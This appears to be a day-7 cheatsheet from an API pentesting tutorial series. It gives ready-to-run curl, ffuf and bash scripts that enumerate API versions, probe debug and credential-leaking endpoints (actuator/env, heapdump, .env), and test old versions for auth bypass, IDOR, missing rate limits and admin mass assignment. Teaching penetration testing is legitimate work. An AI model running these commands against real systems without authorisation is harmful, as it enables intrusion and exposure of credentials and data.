# API Versioning Attacks: Finding v1, v2 & Debug Endpoints

> **Series:** 30-Day API Pentesting  
> **Day:** 7 — Week 1: API Fundamentals & Recon  
> **Topic:** API Versioning & Hidden Endpoints Cheatsheet

---

## Why Versioning Creates Vulnerabilities

When teams release v2 or v3, v1 doesn't disappear — it keeps running in production. Security fixes applied to v3 are rarely backported. Rate limiting, auth checks, IDOR patches, mass assignment fixes — all live in v3. v1 is frozen, forgotten, and yours.

**Rule:** Every endpoint patched in v3 is potentially still broken in v1.

---

## 01 · Version Enumeration

```bash
# Version paths to always test
for v in v1 v2 v3 v4 v5 beta alpha dev internal \
          latest stable 2023 2024 1.0 1.1 2.0; do
  code=$(curl -s -o /dev/null -w "%{http_code}" https://target.com/api/$v/users)
  echo "$v: $code"
done

# ffuf - fast version brute force
ffuf -u https://target.com/api/FUZZ/users \
  -w versions.txt \
  -mc 200,201,401,403 \
  -o versions_found.json

# Also try different base paths
for base in /api /api/rest /rest /service /services /v; do
  for v in v1 v2 v3; do
    curl -s -o /dev/null -w "$base/$v: %{http_code}\n" \
      https://target.com$base/$v/users
  done
done

# Versions wordlist (save as versions.txt):
# v1, v2, v3, v4, v5, v6
# api/v1, api/v2, api/v3
# beta, alpha, dev, internal, stable, latest
# 1, 2, 3, 1.0, 1.1, 2.0, 2023, 2024
```

---

## 02 · Hidden Debug & Internal Endpoints

```bash
# Spring Boot Actuator — most critical
curl https://target.com/actuator
curl https://target.com/actuator/env       # credentials, config
curl https://target.com/actuator/beans     # all Spring beans
curl https://target.com/actuator/mappings  # all URL mappings!
curl https://target.com/actuator/heapdump  # full memory dump

# General debug endpoints
for path in .env config debug test internal \
            admin backdoor console shell exec \
            phpinfo server-status nginx_status \
            health healthz status metrics; do
  code=$(curl -s -o /dev/null -w "%{http_code}" https://target.com/$path)
  [ "$code" != "404" ] && echo "FOUND: /$path [$code]"
done

# Framework-specific paths
# Laravel: /telescope /horizon /debugbar /_ignition/execute-solution
# Django:  /django-admin /__debug__
# Rails:   /rails/info /sidekiq /letter_opener
# Express: stack traces on /nonexistent → framework version
# FastAPI: /docs /redoc /openapi.json (enabled by default!)
```

---

## 03 · Version-Specific Attack Patterns

```bash
# Pattern 1 — Auth bypass on old version
# Test the same endpoint across all versions
for v in v1 v2 v3; do
  echo -n "$v: "
  curl -s -o /dev/null -w "%{http_code}" \
    https://target.com/api/$v/admin/users
    # No Authorization header!
done
# v3: 401  v2: 401  v1: 200  ← auth bypass on v1!

# Pattern 2 — IDOR fixed in v3, still broken in v1
# Account B tests Account A's data
curl -H "Authorization: Bearer TOKEN_B" \
  https://target.com/api/v1/invoices/1001  # owned by Account A
# If 200 = IDOR still present in v1 even though v3 was patched

# Pattern 3 — Rate limiting missing in old version
for v in v1 v2 v3; do
  echo "Testing $v rate limit..."
  for i in $(seq 1 20); do
    curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/api/$v/auth/login \
      -d '{"email":"test@test.com","password":"wrong"}'
  done | sort | uniq -c
  # If no 429 in v1 = rate limit missing
done

# Pattern 4 — Mass assignment fixed in v3, not v1
curl -X POST https://target.com/api/v1/register \
  -H "Content-Type: application/json" \
  -d '{"email":"x@x.com","password":"Test123","role":"admin"}'
# v3 may strip role field, v1 might accept it
```

---

## 04 · Endpoint Fuzzing Strategy

```bash
# Best wordlists for API endpoint discovery
# /opt/SecLists/Discovery/Web-Content/api/objects.txt
# /opt/SecLists/Discovery/Web-Content/api/actions.txt
# /opt/SecLists/Discovery/Web-Content/raft-large-words.txt

# ffuf - fuzz endpoints on discovered version
ffuf -u https://target.com/api/v1/FUZZ \
  -w /opt/SecLists/Discovery/Web-Content/api/objects.txt \
  -mc 200,201,401,403 \
  -fc 404 \
  -t 50 \
  -o v1_endpoints.json

# gobuster with extensions
gobuster dir \
  -u https://target.com/api/v1 \
  -w /opt/SecLists/Discovery/Web-Content/big.txt \
  -x json,xml,yaml \
  -t 30

# feroxbuster - recursive, finds nested endpoints
feroxbuster \
  -u https://target.com/api/v1 \
  -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt \
  --filter-status 404 \
  -d 3

# Compare endpoints between versions
# What exists in v1 that doesn't exist in v3?
diff \
  <(ffuf -u target.com/api/v1/FUZZ -w api.txt -mc 200 -s | sort) \
  <(ffuf -u target.com/api/v3/FUZZ -w api.txt -mc 200 -s | sort)
# Endpoints only in v1 = forgotten = test them all
```

---

## 05 · JavaScript & Source Code Mining

```bash
# Download all JS files
gau target.com | grep "\.js$" | sort -u > js_files.txt

# Extract all API version paths
cat js_files.txt | while read url; do
  curl -s "$url" | grep -oE '"/api/v[0-9]+[^"]*"' | tr -d '"'
done | sort -u

# LinkFinder - automated JS endpoint extraction
python3 linkfinder.py -i https://target.com -d -o results.html

# Manual grep approach
curl -s https://target.com/app.js | \
  grep -oE '("|'"'"')(/api|/v[0-9])[^"'"'"']+' | \
  tr -d '"'"'" | sort -u

# Wayback Machine - historical version endpoints
gau target.com | grep -E '/v[0-9]+/' | sort -u
waybackurls target.com | grep '/api/' | sort -u

# GitHub source code search
site:github.com "target.com" "/api/v1"
site:github.com "target.com" "internal" "endpoint"
```

---

## 06 · Full Version Attack Automation

```bash
#!/bin/bash
TARGET=$1
echo "[*] API Version Attack Script — $TARGET"

# Step 1 — Find all live versions
echo "[1] Enumerating versions..."
for v in v1 v2 v3 v4 beta alpha dev internal latest; do
  code=$(curl -s -o /dev/null -w "%{http_code}" $TARGET/api/$v/)
  [ "$code" != "404" ] && echo "    LIVE: /api/$v [$code]" && \
    echo "/api/$v" >> live_versions.txt
done

# Step 2 — Test auth on all versions
echo "[2] Testing auth bypass..."
while read version; do
  code=$(curl -s -o /dev/null -w "%{http_code}" $TARGET$version/admin/users)
  echo "    $version/admin/users: $code"
done < live_versions.txt

# Step 3 — Check debug endpoints
echo "[3] Checking debug endpoints..."
for path in actuator actuator/env debug .env console phpinfo; do
  code=$(curl -s -o /dev/null -w "%{http_code}" $TARGET/$path)
  [ "$code" = "200" ] && echo "    FOUND: /$path [CRITICAL]"
done

echo "[+] Done!"
```

---

## Checklist

```
☐  Enumerate all versions — try v1-v5, beta, alpha, latest, stable
☐  Test old vs new behavior — same endpoint, different version
☐  Check debug endpoints — /actuator /debug /console /.env /phpinfo
☐  Mine JS files — grep '/api/' all .js files for hidden routes
☐  Wayback for old paths — gau + waybackurls for historical endpoints
☐  Compare v1 vs v3 IDOR — IDOR fixed in v3? Still works in v1?
☐  Rate limit on old versions — POST /api/v1/login x100, check 429
☐  Mass assignment on v1 — add role/admin to POST body on old version
```

---

*30-Day API Pentesting Series — follow for more.*
